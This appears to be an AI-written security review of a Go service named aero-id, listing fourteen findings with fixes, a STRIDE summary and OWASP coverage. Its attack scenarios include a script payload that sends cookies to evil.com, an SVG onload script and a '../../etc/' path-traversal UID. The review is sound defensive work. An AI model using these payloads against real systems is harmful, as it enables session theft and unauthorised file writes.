Now I have a thorough understanding of the entire codebase. Let me compile the comprehensive security review.

---

# Security Review: aero-id

**Review Date**: 2026-07-12
**Service**: aero-id — File/Message/Comment service with external SSO identity

---

## Findings

### Finding 1 — Stored XSS via Local Storage File Download

| Field | Detail |
|-------|--------|
| **Category** | Input Validation / Data Protection |
| **Severity** | **High** |
| **Title** | File download serves content with browser-sniffed Content-Type, enabling stored XSS |
| **Location** | `internal/handler/http/file.go:210-214` — `Download()` handler |
| **Description** | The local-storage download handler serves files via `io.Copy` without setting `Content-Type` or `Content-Disposition` headers. Go's `net/http` automatically sniffs the content type via `http.DetectContentType`. If a user uploads a file starting with `<html>` or `<script>`, it will be served as `text/html` and rendered inline by browsers. The `allowed_mime_types` list defaults to empty (accept any type), so HTML files can be uploaded. The HMAC-signed download URL provides access control, but any recipient of a valid URL can receive the XSS payload. |
| **Attack Scenario** | 1. Attacker registers with SSO, obtains aero-id token. 2. Uploads a file named `profile.html` with content `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`. The file is accepted (no MIME restriction). 3. Attacker obtains the presigned download URL via `GET /v1/files/:id/url` and shares it. 4. Victim clicks the link — browser sniffs `text/html`, executes script. XSS in the aero-id domain. |
| **Impact** | Session token theft (if cookies are set on this domain), arbitrary actions as the victim, data exfiltration. |
| **Recommendation** | Add `X-Content-Type-Options: nosniff` header and set `Content-Type` from the stored `mime_type` field. Also set `Content-Disposition: attachment; filename="..."` to force download rather than rendering: |
| **Effort** | S (1-2 hours) |

```go
// In Download handler, before io.Copy:
c.Header("X-Content-Type-Options", "nosniff")
if f.MimeType != "" {
    c.Header("Content-Type", f.MimeType)
}
c.Header("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, url.PathEscape(f.Name)))
// Note: you'd need the File domain object here, not just the storage key.
// Consider returning the stored MIME type from the download URL metadata.
```

---

### Finding 2 — No Size Validation on Presigned S3 Uploads

| Field | Detail |
|-------|--------|
| **Category** | Input Validation / Denial of Service |
| **Severity** | **High** |
| **Title** | Presigned upload bypasses server-side size cap during upload; oversized blob is accepted by S3 then eagerly deleted |
| **Location** | `internal/service/file_presign.go:60-107` — `CompleteUpload()` |
| **Description** | `PresignUpload` returns a presigned S3 PUT URL with no size limit. The client can upload any size object directly to S3. When `CompleteUpload` is called, `Stat` retrieves the size and rejects oversized files, then eagerly deletes the blob. However: (1) the S3 bucket incurs storage/egress costs for the oversized blob before deletion; (2) a slow-write attack could keep the connection open indefinitely; (3) there is no garbage collection for objects that are uploaded via presigned URL but never finalized — these become orphaned storage. The `StorageGCConfig` is OPT-IN (disabled by default), so these orphans accumulate. |
| **Attack Scenario** | Attacker repeatedly calls `PresignUpload` then PUTs enormous files (e.g., 100 GB) directly to S3 via the presigned URL, never calling `CompleteUpload`. Each PUT costs the service owner S3 storage (until GC cleans up, if enabled) and S3 PUT request fees. If GC is disabled, orphaned blobs accumulate indefinitely. |
| **Impact** | Financial cost from S3 storage/requests; potential disk space exhaustion on local storage; DoS via storage quota consumption. |
| **Recommendation** | Add an S3 lifecycle policy to expire incomplete multipart uploads and objects with a specific tag/prefix after 24h. On `PresignUpload`, set a `Content-Length` requirement in the presigned URL conditions if the S3 SDK supports it. For the local backend, `PresignPut` returns `ErrNotSupported`, which is correct. Also, enable and tune `StorageGCConfig` in production. |
| **Effort** | M (for lifecycle policy + code changes) |

---

### Finding 3 — Hardcoded Secrets in Config

| Field | Detail |
|-------|--------|
| **Category** | Cryptography / Authentication |
| **Severity** | **High** |
| **Title** | Default `signing_key` and DB password committed to repository |
| **Location** | `configs/config.yaml` lines 38 (`password: aero`), 102 (`signing_key: change-me-please-very-long-random`) |
| **Description** | The default config contains a plaintext database password `aero` and a placeholder signing key `change-me-please-very-long-random`. The AGENTS.md explicitly states "Secrets via env only, never committed." While these are intended as development defaults, the risk is deployment to production without overriding via `AERO_ID_DATABASE_PASSWORD` / `AERO_ID_SIGNING_KEY`. The `signing_key` guards the HMAC presigned URL mechanism — attackers who learn it can forge download URLs for any file, bypassing authentication entirely. |
| **Attack Scenario** | An operator deploys the default config without env overrides. An attacker who gains read access to the repo (or the deployed binary/config) extracts the signing key, forges valid `sig` parameters for arbitrary storage keys, and downloads any file in the local storage backend without authentication. |
| **Impact** | Complete bypass of file access control; ability to download any stored file. |
| **Recommendation** | Add a startup check that warns (or fails) if the signing key equals a known default. In production, always use `AERO_ID_SIGNING_KEY` env var. Consider using a secrets manager. |
| **Effort** | S |

```go
// In config validation:
if c.SigningKey == "change-me-please-very-long-random" || len(c.SigningKey) < 32 {
    return fmt.Errorf("signing_key must be at least 32 characters and not the default value")
}
```

---

### Finding 4 — Unrestricted MIME Types + No Content Security Headers

| Field | Detail |
|-------|--------|
| **Category** | Input Validation / Compliance |
| **Severity** | **Medium** |
| **Title** | File upload MIME type allow-list defaults to "any"; not enforced at handler level |
| **Location** | `configs/config.yaml` line 83 (`allowed_mime_types: []`), `internal/service/file.go:135-144` (`mimeAllowed`) |
| **Description** | The `allowed_mime_types` config is empty by default, which the service interprets as "allow all." Combined with Finding 1 (no Content-Type enforcement on download), this enables upload of HTML, SVG with script, or other dangerous types. Even with a proper Content-Type header on download, allowing all types increases the attack surface (e.g., uploaded `.html` files accessed via other means, or SVG XSS through file sharing). |
| **Attack Scenario** | Attacker uploads an SVG file with embedded JavaScript (`<svg onload=alert(1)>`). If the download mechanism ever serves it with `image/svg+xml`, the script executes. Or uploads a PDF with exploits targeting browser PDF viewers. |
| **Impact** | Stored XSS, client-side exploitation via malicious file types. |
| **Recommendation** | Set a restrictive allow-list in production config (e.g., image/*, application/pdf, text/plain). Validate MIME type at the HTTP handler layer before accepting the upload, not just at the service layer. Also set `X-Content-Type-Options: nosniff` on file downloads. |
| **Effort** | S |

---

### Finding 5 — LIKE-based Search Wildcard Injection

| Field | Detail |
|-------|--------|
| **Category** | Input Validation / Denial of Service |
| **Severity** | **Medium** |
| **Title** | `SearchFilesLike` / `SearchMessagesLike` / `SearchCommentsLike` vulnerable to LIKE wildcard abuse |
| **Location** | `internal/repository/file.go:130-144`, `internal/repository/message.go` (search methods), `internal/repository/comment.go` (search methods) |
| **Description** | The LIKE-based search fallbacks construct a pattern as `"%" + query + "%"`. While the query is properly parameterized (preventing SQL injection), the PostgreSQL `LIKE` operator interprets `%` and `_` as special wildcards. An attacker can craft a query like `%` or `____%` to force expensive full-table pattern matching. The `tsvector`/`tsquery` FTS path in `SearchFiles` / `SearchMessages` / `SearchComments` does not have this issue (plainto_tsquery strips wildcards). |
| **Attack Scenario** | Attacker sends `search?query=%` to a LIKE-based search endpoint. PostgreSQL must scan every row and match the pattern (which matches all rows). With large datasets, this causes CPU/I/O spikes and slow responses. Repeating this can degrade service for other users. |
| **Impact** | Denial of Service via expensive unanchored pattern matching. |
| **Recommendation** | Strip or escape `%` and `_` characters from user input before constructing LIKE patterns. Or, better, restrict LIKE-based search to an explicit admin-only fallback and use FTS (`search_vector` + `tsquery`) as the primary path. |
| **Effort** | S |

```go
// In repository search methods:
pattern := strings.ReplaceAll(strings.ReplaceAll(query, "%", "\\%"), "_", "\\_")
pattern = "%" + pattern + "%"
// Note: requires ESCAPE clause in SQL: ... ILIKE ? ESCAPE '\'
```

---

### Finding 6 — SSO gRPC Connection Insecure by Default

| Field | Detail |
|-------|--------|
| **Category** | Cryptography / Authentication |
| **Severity** | **Medium** |
| **Title** | SSO gRPC connection uses insecure (plaintext) in dev config; production TLS is config-only, not enforced |
| **Location** | `configs/config.yaml` line 49 (`insecure: true`), `internal/sso/client.go` |
| **Description** | The dev config sets `sso.insecure: true`, meaning the gRPC connection to the SSO server uses no transport security. In production, this must be set to `false` and TLS configured via `tls_ca_file`, `tls_cert_file`, `tls_key_file`. However, there is no config validation to enforce TLS in non-dev environments, and no validation that mTLS certificate/key files exist when `insecure: false`. An attacker on the network could MITM the SSO gRPC connection, steal tokens, or inject fake user data. |
| **Attack Scenario** | Attacker with network access between aero-id and SSO performs a MITM attack: intercepts `ValidateToken` responses returning arbitrary `uid` values, gaining access as any user; or intercepts `GetUsers` responses to poison the user cache. |
| **Impact** | Complete authentication bypass; privilege escalation to any user identity. |
| **Recommendation** | In config validation, when `app.env != "dev"` (or similar), reject `sso.insecure: true`. Validate that TLS cert/key files exist when `insecure: false`. |
| **Effort** | S |

---

### Finding 7 — `cappedReader` Off-by-One Allows One Extra Byte

| Field | Detail |
|-------|--------|
| **Category** | Input Validation |
| **Severity** | **Low** |
| **Title** | `cappedReader` permits reading one byte beyond the limit before erroring |
| **Location** | `internal/service/file.go:150-159` — `cappedReader.Read()` |
| **Description** | The `cappedReader` logic: if `c.left < 0` after subtracting `n`, it returns `errFileTooLarge` but also returns the bytes read `n`. This means a read that pushes `left` from 0 to -1 (reading 1 byte when `left == 0`) returns success with 1 byte, then the NEXT `Read()` call returns `errFileTooLarge`. In practice, a file exactly at `maxBytes` will trigger this; a file at `maxBytes + 1` will successfully write 1 byte over the limit before failing. This is a minor integrity issue. |
| **Attack Scenario** | Very limited: attacker can upload 1 byte beyond limit. The extra byte is written to storage but the hash is computed on all bytes up to and including the extra byte (since `sha256` receives the data before the error propagates). The error then causes `Put` to fail (returning an error), which leads to storage cleanup. So in practice, the size cap works but may have a 1-byte slop. |
| **Impact** | Negligible in practice; the upload fails and the partial blob is cleaned up. |
| **Recommendation** | Simplify: check before reading: |
| **Effort** | S |

```go
func (c *cappedReader) Read(p []byte) (int, error) {
    if c.left <= 0 {
        return 0, errFileTooLarge
    }
    if int64(len(p)) > c.left {
        p = p[:c.left]
    }
    n, err := c.r.Read(p)
    c.left -= int64(n)
    if c.left <= 0 && err == nil {
        return n, errFileTooLarge
    }
    return n, err
}
```

---

### Finding 8 — SSE Replay Allows Notification History Enumeration

| Field | Detail |
|-------|--------|
| **Category** | Information Disclosure |
| **Severity** | **Low** |
| **Title** | SSE `last_event_id` can be manipulated to replay old notifications |
| **Location** | `internal/handler/http/events.go:67-73` — `replayMissed()` |
| **Description** | The SSE handler accepts `last_event_id` as a unix-millis timestamp and replays all notifications after that timestamp for the authenticated user. While capped at 50 results, the `last_event_id` parameter is not validated against the user's actual last known event. An attacker could set `last_event_id=0` (rejected by `millis <= 0` check) but could set it to `1` (accepted, since `millis > 0`) to replay the user's earliest notifications. Still scoped to the authenticated user's own notifications. |
| **Attack Scenario** | An attacker who obtains a valid token can enumerate a user's full notification history by iterating `last_event_id` backwards. Notifications contain actor UIDs, subject types/IDs, timestamps — this metadata reveals communication patterns. |
| **Impact** | Limited information disclosure of notification metadata. Since notifications are already scoped to the authenticated user, this only reveals what the user already has access to, but in bulk. |
| **Recommendation** | Store the user's most recent `last_event_id` in the SSE subscription session and reject requests that specify an id older than the session's recorded value (or simply cap the replay window to a reasonable duration, e.g., last 24h). |
| **Effort** | M |

---

### Finding 9 — No Rate Limiting Enabled by Default

| Field | Detail |
|-------|--------|
| **Category** | Denial of Service |
| **Severity** | **Medium** |
| **Title** | Rate limiting is opt-in and disabled by default, leaving endpoints defenseless against brute-force and DoS |
| **Location** | `configs/config.yaml` line 74 (`rate_limit.enabled: false`) |
| **Description** | The in-memory token bucket rate limiter is disabled by default. Without rate limiting, attackers can brute-force UUIDs (for file/message/comment IDs), rapidly create resources to exhaust storage, or spam the SSO endpoint with validation requests (beyond the circuit breaker). While a reverse proxy (nginx, ALB) provides some protection, the opts-in design means a misconfigured deployment has no application-level rate limiting. |
| **Attack Scenario** | Attacker sends 10,000 concurrent `POST /v1/messages` requests, exhausting the database connection pool, filling disk, and degrading service for legitimate users. |
| **Impact** | DoS, resource exhaustion. |
| **Recommendation** | Enable rate limiting by default with sensible defaults (e.g., 100 req/s, burst 200). Document the per-instance limitation and the path to Redis-backed distributed rate limiting for horizontal scaling. |
| **Effort** | S |

---

### Finding 10 — Comment/Message Content No Length Validation

| Field | Detail |
|-------|--------|
| **Category** | Input Validation / Denial of Service |
| **Severity** | **Low** |
| **Title** | No maximum length enforced on message/comment content |
| **Location** | `internal/service/message.go` — `Send()`, `Edit()`; `internal/service/comment.go` — `Create()`, `Edit()` |
| **Description** | Message and comment content are checked for non-emptiness but not for maximum length. An attacker could send messages with gigabytes of text, causing database storage exhaustion, slow queries (especially with the GIN/tsvector index), and slow JSON serialization in responses. The database TEXT column can hold up to 1 GB. |
| **Attack Scenario** | Attacker sends a message with 100 MB of text content, repeated 1000 times. Each message gets indexed into the `search_vector` GIN index, consuming disk space and memory. Listing the inbox becomes slow due to large row sizes. |
| **Impact** | Storage exhaustion, degraded query performance. |
| **Recommendation** | Enforce maximum content length at both service and database levels. |
| **Effort** | S |

```go
const MaxContentLen = 10000 // 10KB for messages/comments

// In service Send():
if len(in.Content) > MaxContentLen {
    return nil, apperr.BadRequest("message.too_long", fmt.Sprintf("content must not exceed %d characters", MaxContentLen))
}
```

---

### Finding 11 — Path Traversal via File Storage Key (Defense in Depth)

| Field | Detail |
|-------|--------|
| **Category** | Input Validation |
| **Severity** | **Low** |
| **Title** | Local storage `keyToPath` uses unsanitized key component |
| **Location** | `internal/storage/local.go:33` — `keyToPath()`, `internal/storage/local.go:41` — `NewKey()` |
| **Description** | `NewKey` constructs a storage key as `ownerUID/YYYY/MM/UUID`. The `ownerUID` comes from SSO token validation and is not sanitized for path separators. If an SSO provider returns UIDs containing `../` or `/` (e.g., some systems use email addresses), a user could create a storage key that writes outside the storage root. For example, a UID of `../../etc/` would create a key `../../etc//2026/07/uuid`, resolving to `/etc/2026/07/uuid` (outside the configured root). Currently, SSO UIDs are validated as non-empty but not for dangerous characters. |
| **Attack Scenario** | An attacker registers with SSO with a UID containing path traversal characters (`../../etc/`). SSO returns this as the validated UID. The user uploads a file, and `NewKey` generates `../../etc//2026/07/uuid`. `keyToPath` resolves to `/etc/2026/07/uuid`, potentially overwriting system files. |
| **Impact** | Arbitrary file write outside the storage root, potentially leading to RCE (e.g., overwriting SSH authorized_keys, cron jobs, or application binaries). |
| **Recommendation** | Sanitize the UID when constructing storage keys. Validate that UIDs contain only safe characters (alphanumeric, underscore, hyphen). Also clean the key with `filepath.Clean` and verify it has the configured root as a prefix. |
| **Effort** | S |

```go
// In NewKey:
func (l *Local) NewKey(ownerUID string) string {
    // Sanitize ownerUID for filesystem use
    safe := strings.Map(func(r rune) rune {
        if unicode.IsLetter(r) || unicode.IsDigit(r) || r == '-' || r == '_' {
            return r
        }
        return '_'
    }, ownerUID)
    now := time.Now().UTC()
    id := idgen.NewID().String()
    return filepath.ToSlash(filepath.Join(safe, now.Format("2006"), now.Format("01"), id))
}

// In keyToPath, add guard:
func (l *Local) keyToPath(key string) string {
    path := filepath.Join(l.cfg.Root, key)
    // Prevent escape via path traversal
    if !strings.HasPrefix(path, filepath.Clean(l.cfg.Root)+string(filepath.Separator)) && path != filepath.Clean(l.cfg.Root) {
        panic("path traversal detected in storage key")
    }
    return path
}
```

---

### Finding 12 — Outbox Webhook Lacks HTTPS Enforcement

| Field | Detail |
|-------|--------|
| **Category** | Cryptography |
| **Severity** | **Medium** |
| **Title** | Outbox webhook URL is not validated for HTTPS; event data may be sent in plaintext |
| **Location** | `internal/config/config.go` — `WebhookConfig`, `internal/outbox/webhook.go` |
| **Description** | The outbox webhook configuration accepts any URL scheme (HTTP, HTTPS, etc.). Events contain payload data that may include user metadata (actor UIDs, content references). If an operator configures an HTTP webhook URL, event data — including the HMAC-SHA256 signature — is transmitted in plaintext over the network. An attacker on the network can observe events (information disclosure) or capture/replay the HMAC signature. |
| **Attack Scenario** | Operator configures webhook URL as `http://webhook.internal:8080/events`. Attacker with LAN access intercepts HTTP traffic, reads event payloads containing user interaction patterns (who messaged whom, who commented on what). |
| **Impact** | Information disclosure of user interaction metadata; potential HMAC replay. |
| **Recommendation** | Validate webhook URL scheme in config validation: reject non-HTTPS URLs (except for localhost in dev). |
| **Effort** | S |

---

### Finding 13 — Meta Map Unlimited Size

| Field | Detail |
|-------|--------|
| **Category** | Input Validation / Denial of Service |
| **Severity** | **Low** |
| **Title** | File/message `Meta` map has no size or key validation |
| **Location** | `internal/service/file.go` — Meta in `CreateFileInput`, `UpdateFileMetadataInput`, `PresignUploadInput`; `internal/service/message.go` — Meta in `SendMessageInput` |
| **Description** | The `Meta` field (`map[string]any`) is accepted from user input and stored directly as JSONB without any validation on key count, key length, value types, or total payload size. An attacker could inject a Meta map with thousands of keys, extremely long key names, or deeply nested structures. This is stored in a JSONB column and indexed by queries. Large meta payloads inflate row sizes and degrade query performance. |
| **Attack Scenario** | Attacker uploads a file with a Meta map containing 10,000 keys, each 1KB long, creating a 10MB JSONB column per row. Repeated 1000 times → 10GB of metadata bloat. Inbox queries that load files (including Meta) become slow. |
| **Impact** | Storage bloat, degraded query performance, potential DoS. |
| **Recommendation** | Limit the number of meta keys (e.g., max 20) and total JSONB size (e.g., max 10KB). Validate at the service layer. |
| **Effort** | S |

---

### Finding 14 — SSO Token Cache Serves Stale Tokens During Circuit-Breaker Open

| Field | Detail |
|-------|--------|
| **Category** | Authentication |
| **Severity** | **Medium** |
| **Title** | Circuit breaker fallback serves stale token identities for up to 6 minutes after revocation |
| **Location** | `internal/sso/client.go:101-115` — `validateUpstream()`, `internal/sso/token_cache.go` |
| **Description** | When the SSO circuit breaker is open (after 5 consecutive failures) and a token is not in the primary cache, the client calls `GetStale()` which returns the last-known uid for up to `staleFor` (300s) past the original expiry. Default config: `token_cache_ttl: 60s` + `stale_ttl: 300s` = 6-minute window. During this window, a revoked or expired token (e.g., user logged out, banned, or changed password) is still accepted, as long as it was recently cached. This is a design tradeoff for availability over consistency, documented in AGENTS.md. |
| **Attack Scenario** | User is banned or their session revoked. Attacker who possesses the old token can continue accessing the service for up to 6 minutes (or until the next successful SSO validation that overrides the cache). |
| **Impact** | Delayed enforcement of access revocation. Users can continue accessing resources after their SSO session is revoked. |
| **Recommendation** | Tighten the `stale_ttl` to a lower value (e.g., 30s). Add a webhook-based cache invalidation endpoint that the SSO can call to evict specific tokens immediately. Document the tradeoff in operational runbooks. |
| **Effort** | S (for config change) / L (for cache invalidation endpoint) |

---

## Threat Model (STRIDE) Summary

| Category | Risk Level | Key Concerns |
|----------|-----------|--------------|
| **Spoofing** | **High** | Token forgery prevented by SSO validation. However, stale token cache (Finding 14) allows identity reuse. Path traversal via UID (Finding 11) could lead to stored file impersonation. |
| **Tampering** | **Medium** | HMAC protects download URLs (local backend). Outbox webhooks use HMAC-SHA256 (Finding 12 — but no HTTPS enforcement). GORM parameterization prevents SQL injection. LIKE wildcards (Finding 5) allow pattern-based data extraction. |
| **Repudiation** | **Low** | Audit logging infrastructure present (`AuditLogger` interface via domain events). Outbox provides reliable event persistence. |
| **Information Disclosure** | **High** | **Stored XSS via file download** (Finding 1). SSE replay reveals notification history (Finding 8). Outbox webhook with HTTP leaks event data (Finding 12). LIKE wildcards can be used to brute-force content values. |
| **Denial of Service** | **High** | No rate limiting by default (Finding 9). No content length limits (Finding 10). Presigned uploads accept any size (Finding 2). LIKE wildcards cause expensive queries (Finding 5). Meta map unlimited (Finding 13). |
| **Elevation of Privilege** | **Medium** | Well-guarded: service layer enforces ownership on every operation. Minor risk: stale token cache (Finding 14), UID path traversal (Finding 11). The SSO identity boundary is the root of trust. |

---

## Final Summary

| Field | Rating |
|-------|--------|
| **Overall Security Posture** | **Needs Improvement** |
| **Top 3 Critical Issues** | 1. **Stored XSS via file download** (Finding 1, High) — file download has no Content-Type enforcement or Content-Disposition, enabling browser-rendered XSS. 2. **Hardcoded secrets default** (Finding 3, High) — signing key in config enables complete access control bypass if not overridden. 3. **No size validation on presigned uploads** (Finding 2, High) — attackers can abuse S3 direct uploads to drain storage budget. |
| **Top 3 Quick Wins** | 1. Add `X-Content-Type-Options: nosniff` + `Content-Disposition: attachment` to file download handler (Finding 1, S effort). 2. Add startup validation that rejects default signing key and DB password (Finding 3, S effort). 3. Enable rate limiting with sensible defaults in production config (Finding 9, S effort). |
| **Security Debt** | — SSO stale token serving (6-minute revocation window) needs upstream cache invalidation endpoint or tighter stale TTL. — `StorageGCConfig` (orphan blob cleanup) is opt-in; should be default-enabled for S3 to mitigate abandoned presigned uploads. — No TLS termination at the application level (HTTP server is plaintext) — relies entirely on reverse proxy. — No security headers in responses (CSP, HSTS, X-Frame-Options) — should be configured at the reverse proxy level. — LIKE wildcard sanitization missing in fallback search paths. |

---

### OWASP Top 10 Coverage

| OWASP Category | Status | Notes |
|----------------|--------|-------|
| A01: Broken Access Control | ✅ Good | Service layer enforces ownership on every operation. Both transports share the same service. |
| A02: Cryptographic Failures | ⚠️ Minor | HMAC-SHA256 for presigned URLs is appropriate. SSO gRPC connection can be insecure (Finding 6). Default secrets (Finding 3). |
| A03: Injection | ⚠️ Low | Parameterized queries prevent SQL injection. LIKE wildcards (Finding 5) and path traversal (Finding 11) are edge cases. |
| A04: Insecure Design | ⚠️ Medium | No input size limits (Findings 10, 13). Presigned upload bypasses server-side limits (Finding 2). |
| A05: Security Misconfiguration | ⚠️ High | Default secrets (Finding 3). Rate limiting disabled (Finding 9). Insecure SSO by default (Finding 6). |
| A06: Vulnerable Components | — | Not assessed (Go module dependencies not reviewed) |
| A07: Identification/Auth Failures | ⚠️ Medium | Stale token serving (Finding 14). Auth middleware correctly injects actor into context. |
| A08: Data Integrity Failures | ✅ Good | Outbox transactional writes. HMAC-signed webhooks. |
| A09: Security Logging | ✅ Good | Structured access logs, audit event system, recovery from panics, circuit breaker state tracking. |
| A10: SSRF | ✅ Good | Outbox webhook is the only outbound HTTP; URL is configured, not user-supplied. S3 endpoint is configured. |
